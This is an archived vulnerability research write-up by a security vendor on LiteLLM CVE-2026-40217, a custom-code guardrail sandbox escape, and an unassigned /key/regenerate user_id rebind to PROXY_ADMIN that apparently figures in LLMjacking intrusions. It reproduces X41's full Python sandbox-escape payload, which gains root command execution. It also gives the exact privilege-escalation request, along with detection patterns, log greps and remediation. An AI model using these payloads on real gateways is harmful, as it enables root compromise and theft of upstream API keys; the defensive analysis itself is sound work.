<!-- 原文快照 · 自动归档，请勿手工编辑 -->
<!-- source_url: https://corgea.com/research/cve-2026-40217-litellm-guardrail-sandbox-escape-key-regenerate-rebind-kev-november-2026 -->
<!-- fetched_at: 2026-11-24 07:12:39 -->
<!-- sha256: 03cfc3fe6df8ba169503e149b8fce39d7c5b64f59ce3ddae395a9d1c5f253682 -->

CVE-2026-40217 in CISA KEV: LiteLLM's custom-code guardrail sandbox escape, and the /key/regenerate rebind that Google's LLMjacking report ties to it | Corgea
critical
CVE
CVE-2026-40217

CWE
CWE-94, CWE-693, CWE-420, CWE-639, CWE-269

Affected Surface
PyPI `litellm` and `ghcr.io/berriai/litellm` proxy images `>= 1.81.8, < 1.83.10` (CVE-2026-40217 sandbox escape in `POST /guardrails/test_custom_code`, fixed in `v1.83.10-stable` by PR `#25818`)
LiteLLM proxy builds without PR `#27793` / `#27819` (`/key/regenerate` `user_id` rebind to `PROXY_ADMIN`), first shipped in `v1.84.0` on 14 May 2026 and `v1.85.0` on 17 May 2026; no `1.83.x` stable patch carries it
LiteLLM deployments running the default Docker image, where the proxy process runs as `root`
Organizations whose LiteLLM gateways hold upstream provider keys (OpenAI, Anthropic, Bedrock, Vertex AI, Azure OpenAI) that LLMjacking crews resell or burn

TL;DR

On 18 November 2026 CISA added CVE-2026-40217 (BerriAI LiteLLM) to the KEV catalog. Federal agencies have until 2 December . The CVE covers a sandbox escape in LiteLLM’s custom-code guardrail test endpoint, POST /guardrails/test_custom_code . Anyone who can call that endpoint can run Python as the proxy process, which is root in the default Docker image. The fix shipped in v1.83.10-stable in April.

The exploitation evidence is less clear than the KEV entry suggests. CISA’s listing follows Google Threat Intelligence Group (GTIG) reporting on LLMjacking intrusions. GTIG’s 16 November threat tracker calls CVE-2026-40217 “a sandbox escape in LiteLLM that allows an attacker to elevate limited-access inference keys (‘Virtual Keys’) into full administrative credentials.” Its longer 2 November report describes the same intrusion differently: the attacker “exploited a user ID rebind vulnerability in the /key/regenerate endpoint (CVE-2026-40217)” to turn standard virtual keys into PROXY_ADMIN .

Those are two different bugs:

Sandbox escape (the actual CVE-2026-40217). You need a key that can reach /guardrails/test_custom_code , which is a proxy-admin key by default. Found by X41 D-Sec, published 9 April, fixed in v1.83.10-stable .

/key/regenerate user_id rebind (no CVE, no advisory). Any non-admin virtual key could point itself at an admin user row and become PROXY_ADMIN . Fixed on 13 May by PR #27793 , first released in v1.84.0 (14 May) and v1.85.0 (17 May).

Chained, they go from a leaked inference key to root on the gateway. Upgrade to 1.84.0 or later , or better, the current release ( 1.110.1 on PyPI on 19 November). Being on 1.83.10 + closes the CVE but leaves the rebind open. EPSS rated CVE-2026-40217 at 0.17 (97th percentile) on 18 November.

Affected packages and projects

Ecosystem Package Issue Affected versions Fixed version
PyPI litellm CVE-2026-40217 / GHSA-wxxx-gvqv-xp7p : custom-code guardrail sandbox escape >= 1.81.8, < 1.83.10 1.83.10 ( v1.83.10-stable , PR #25818 )
Container ghcr.io/berriai/litellm same images built before the 15 April fix v1.83.10-stable and later
PyPI litellm /key/regenerate user_id rebind to PROXY_ADMIN (no CVE or GHSA) releases without PR #27793 / #27819 , including every 1.83.x stable tag 1.84.0 (14 May 2026), 1.85.0 (17 May 2026) and later
Container ghcr.io/berriai/litellm same same v1.84.0 and later

LiteLLM’s advisory text says “Fixed in 1.83.11 ”, but its own patched-version field says >= 1.83.10 , and the fix commit is in the v1.83.10-stable tag. The PoC repository learner202649/CVE-2026-40217-PoC also warns that the v1.83.10-stable image was rebuilt after the patch. Pin by digest, not by tag, when you check.

Technical analysis

1. CVE-2026-40217: a regex denylist in front of exec

Before April, the guardrail test endpoint ran user-supplied code like this ( litellm/proxy/guardrails/guardrail_endpoints.py ):

# Step 0: Security validation - check for forbidden patterns
validate_custom_code(request.custom_code) # regex over the SOURCE TEXT

# Step 1: Compile the custom code with restricted environment
exec_globals = get_custom_code_primitives().copy() # http_get, regex helpers, ...
exec_globals[ "__builtins__" ] = {} # "Remove access to builtins"
exec ( compile (request.custom_code, "<guardrail>" , "exec" ), exec_globals)
validate_custom_code in code_validator.py was a list of regexes over the submitted string:

FORBIDDEN_PATTERNS = [
( r " \b import \s + " , "import statements are not allowed" ),
( r " __import__ \s * \( " , "__import__() is not allowed" ),
( r " \b getattr \s * \( " , "getattr() is not allowed" ),
( r " __builtins__ " , "__builtins__ access is not allowed" ),
( r " __globals__ " , "__globals__ access is not allowed" ),
( r " __code__ " , "__code__ access is not allowed" ),
( r " __class__ " , "__class__ access is not allowed" ),
...
]
This has two weaknesses. The regexes only see literal text, so any name built at runtime gets past them. And emptying __builtins__ doesn’t remove the functions the sandbox hands in on purpose ( http_get and the other primitives). Each of those is a normal Python function whose __globals__ still points at the unrestricted module namespace.

X41’s published payload uses both. Here it is with our comments:

def apply_guardrail (inputs, request_data, input_type):
obj = str .mro()[ 1 ] # <class 'object'> without writing __class__ or __bases__
def g (fn):
yield fn.placeholder # bytecode does LOAD_ATTR co_names[0] on fn
c = g( None ).gi_code # generator's code object; gi_code was not blocked
gn = "_" + "_gl" + "ob" + "als" + "_" + "_" # "__globals__", assembled so no regex sees it
cn = "_" + "_co" + "de_" + "_" # "__code__"
obj. __setattr__ (g, cn, c.replace( co_names = (gn,)))
# rewrite the name table: fn.placeholder -> fn.__globals__
# then swap g's code via object.__setattr__ (no setattr() call)
for v in g(http_get): # http_get is a sandbox primitive defined in LiteLLM's module
gd = v # gd = http_get.__globals__ (LiteLLM's real module globals)
break
bn = "_" + "_bu" + "ilt" + "ins" + "_" + "_"
imp = gd[bn][ "_" + "_im" + "po" + "rt_" + "_" ] # real builtins -> real __import__
return { "rce" : imp( "os" ).popen( "id" ).read()} # uid=0(root) in the default image
The source never contains a forbidden token, so validate_custom_code passes it. The bytecode then reads __globals__ because the name table was edited after compilation, which is the “bytecode rewriting” in CISA’s description. On the default image X41 got back uid=0(root) .

The fix, PR #25818 (commit 0a1b4427a6 , merged 15 April), deletes code_validator.py and compiles guardrail code with RestrictedPython instead:

- try:
- validate_custom_code(request.custom_code)
- except CustomCodeValidationError as e:
- ...
- exec_globals = get_custom_code_primitives().copy()
- exec_globals["__builtins__"] = {}
- try:
- exec(compile(request.custom_code, "<guardrail>", "exec"), exec_globals)
+ exec_globals = build_sandbox_globals()
+ try:
+ compiled = compile_sandboxed(request.custom_code)
+ exec(compiled, exec_globals) # noqa: S102
compile_restricted rewrites the AST so that attribute access goes through safer_getattr , which refuses names that start with an underscore. That blocks gi_code.replace , __setattr__ and __globals__ whether they are written literally or not. LiteLLM later raised the RestrictedPython minimum to 8.5 (PR #38715 , 28 August).

2. The /key/regenerate rebind GTIG describes

LiteLLM decides a request’s role from the user_id stored on the virtual key. _return_user_api_key_auth_obj looks that ID up in litellm_usertable and returns PROXY_ADMIN if the row’s role is admin. One such row always exists: default_user_id , created the first time someone logs into the admin UI with a password.

/key/update already refused to let a non-admin change a key’s user_id . /key/regenerate did not. _execute_virtual_key_regeneration checked team and org but not user_id , and prepare_key_update_data passed the field through to the Prisma update. A non-admin holding a key could do this:

POST /key/regenerate
Authorization : Bearer sk-<ordinary virtual key>
Content-Type : application/json

{ "key" : "sk-<same key>" , "user_id" : "default_user_id" }
On the next request the regenerated key resolves to default_user_id and gets PROXY_ADMIN . GTIG says it saw exactly this outcome: “standard Virtual Keys” turned into “full PROXY_ADMIN master administrative credentials.”

PR #27793 moved the /key/update check into a shared helper and calls it from regenerate too:

def _validate_caller_can_change_key_ownership (data, existing_key_row, user_api_key_dict) -> None :
if user_api_key_dict.user_role == LitellmUserRoles. PROXY_ADMIN .value:
return
fields_set = getattr (data, "model_fields_set" , None ) or set ()
if "user_id" not in fields_set:
return
incoming_user_id = getattr (data, "user_id" , None )
if incoming_user_id is None or incoming_user_id == "" :
raise HTTPException( status_code = 403 ,
detail = "Non-admin users cannot remove the user_id from a key." )
if incoming_user_id != getattr (existing_key_row, "user_id" , None ):
raise HTTPException( status_code = 403 ,
detail = f "Non-admin caller is not allowed to rebind the key from ..." )
The same PR also fixed a premium-gate check on master-key rotation that only tested whether new_master_key was present, without checking that the caller held the master key. The fix merged to main on 13 May at 00:58 UTC, and the backport (PR #27819 ) landed on the litellm_1.84.0rc2 branch at 06:36 UTC. Our tag comparison shows it in v1.84.0 and v1.85.0 but not in any v1.83.x-stable tag.

Put together, a stolen inference key becomes PROXY_ADMIN through the rebind. Admin access opens /guardrails/test_custom_code , and on a build older than 1.83.10 the sandbox escape gives a root shell. GTIG doesn’t say which LiteLLM version the victim ran or whether the second step happened. Its reporting only describes the jump from inference key to admin.

3. What the LLMjacking operators did next

According to GTIG’s 2 November report, a follow-on cluster bought “pre-validated Virtual Keys” from the actor who got initial access, then escalated on the victim’s LiteLLM gateway and kept persistent admin control. In the wider set of intrusions, GTIG describes attackers enabling paid model APIs and running up more than $100,000 in a day, “burn and rotate” service accounts to get around rate limits, and attackers hosting their own LiteLLM gateways to route resold traffic. Victims were in financial services, retail, technology and transportation across North America, South America and Asia Pacific.

IOCs

GTIG published no LiteLLM-specific IP addresses or domains. Look for behavior instead:

POST /key/regenerate from non-admin keys with a user_id field in the body, especially "user_id": "default_user_id" or a value that doesn’t match the key’s current owner.

Calls to /guardrails/test_custom_code from any key you don’t expect to author guardrails. Payload strings to look for: gi_code , co_names , mro() , __setattr__ , or names split across concatenated string literals ( "_"+"_gl" ).

Child processes ( sh , bash , curl , python -c ) spawned by the LiteLLM proxy.

Bursts of max_tokens=1 or temperature-zero requests. GTIG calls these key “validation sweeps”.

New virtual keys, users or teams created outside your change process, and sudden spend spikes on provider dashboards.

Detection and remediation

# 1. Installed version
pip show litellm | grep -i ^version
python -c 'import litellm, importlib.metadata as m; print(m.version("litellm"))'

# 2. Lockfiles and requirement pins
grep -rnE '^litellm([=<>~!]=?|\[)' requirements * .txt pyproject.toml poetry.lock uv.lock Pipfile.lock 2> /dev/null

# 3. Container image in use (compare the digest, since tags were rebuilt)
docker inspect --format '{{index .RepoDigests 0}} {{.Config.Image}}' < litellm-containe r >
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{range .status.containerStatuses[*]}{.imageID}{"\n"}{end}{end}' | grep -i litellm

# 4. Was the vulnerable endpoint ever hit? (proxy / ingress access logs)
grep -E 'POST /guardrails/test_custom_code' /var/log/nginx/access.log *
grep -E 'POST /key/regenerate' /var/log/nginx/access.log *

# 5. Keys bound to admin users (run against the LiteLLM Postgres DB)
psql " $DATABASE_URL " -c "
SELECT t.token, t.key_alias, t.user_id, u.user_role, t.updated_at
FROM \" LiteLLM_VerificationToken \" t
JOIN \" LiteLLM_UserTable \" u ON u.user_id = t.user_id
WHERE u.user_role = 'proxy_admin'
ORDER BY t.updated_at DESC;"
What to do:

Upgrade to 1.84.0 or later, preferably the current release. Don’t stop at 1.83.10 or 1.83.14-stable.patch.3 , because those lack the rebind fix.

If you can’t upgrade today, block POST /guardrails/test_custom_code at the ingress (LiteLLM’s own workaround), and block POST /key/regenerate for anything except your admin network.

Audit keys. Any non-admin key that is now bound to an admin user_id , or whose user_id changed recently, should be revoked. Check default_user_id in particular.

Rotate secrets if you find either pattern: the LITELLM_MASTER_KEY , LITELLM_SALT_KEY , every upstream provider key stored in the proxy, and the database credentials. On builds older than 1.83.10 , assume the container was root-compromised and rebuild it.

Run as non-root and keep the admin UI and management routes off the public internet.

Timeline

2026-02-05: litellm 1.81.8, the first release in the advisory’s affected range, goes up on PyPI.

2026-02-13: X41 D-Sec finds the sandbox escape and builds a PoC. LiteLLM acknowledges it on 18 February.

2026-04-09: X41 publishes advisory X41-2026-001 on oss-security, with no vendor patch yet.

2026-04-15: PR #25818 replaces the hand-rolled sandbox with RestrictedPython.

2026-04-19 / 2026-04-27: litellm 1.83.10 uploaded to PyPI (19 April), and the v1.83.10-stable GitHub release published (27 April), both with the fix.

2026-05-07: LiteLLM publishes GHSA-wxxx-gvqv-xp7p ( CVE-2026-40217 ).

2026-05-13: PR #27793 closes the /key/regenerate user_id rebind on main , and PR #27819 backports it.

2026-05-14 / 2026-05-17: v1.84.0 and v1.85.0 ship the rebind fix.

2026-05-19: A public PoC repository for CVE-2026-40217 appears on GitHub.

2026-11-02: GTIG publishes “The Rise of LLMJacking”, describing the /key/regenerate escalation under CVE-2026-40217 .

2026-11-16: GTIG AI Threat Tracker lists CVE-2026-40217 as exploited for privilege escalation.

2026-11-18: CISA adds CVE-2026-40217 to KEV with a due date of 2 December 2026.

Related

CVE-2026-59822: LiteLLM MCP streamable HTTP auth bypass

LiteLLM 1.107.0 PyPI and Docker compromise

From research to remediation
Check whether this pattern exists in your codebase
Turn this research into a remediation workflow. Scan dependencies and package manifests for similar supply-chain risk, then prioritize fixes with reachability context.

Explore dependency scanning Get Demo
References
CISA Known Exploited Vulnerabilities catalog: CVE-2026-40217 (added 18 November 2026)
LiteLLM security advisory GHSA-wxxx-gvqv-xp7p: Sandbox escape in custom-code guardrail
X41 D-Sec advisory X41-2026-001: Guardrail Sandbox Escape in LiteLLM (oss-security, 9 April 2026)
BerriAI/litellm PR #25818 (commit 0a1b4427a6): replace custom_code sandbox with RestrictedPython
BerriAI/litellm PR #27793: close /key/regenerate ownership-rebind and premium-gate bypass
BerriAI/litellm PR #27819: backport /key/regenerate guards to the 1.84.0 release branch
Google Threat Intelligence Group: The Rise of LLMJacking (2 November 2026)
GTIG AI Threat Tracker: Agentic threat activity crosses a significant threshold (16 November 2026)
The Hacker News: CISA warns of 4 exploited flaws linked to ransomware, cryptomining, and LLMjacking attacks
NVD: CVE-2026-40217

Ready to move
Start Securing

Start for Free Get Demo
Free, no credit card | First findings in minutes

Preferences
Manage your tracking choices

Close
Necessary Required for consent storage and core website behavior. These are always enabled.

Measurement Helps us understand site usage, performance, and session recordings with Google Analytics and PostHog.

Marketing Supports ad attribution and audience measurement with LinkedIn and consent-aware tags managed through Google Tag Manager.

Only necessary Save preferences
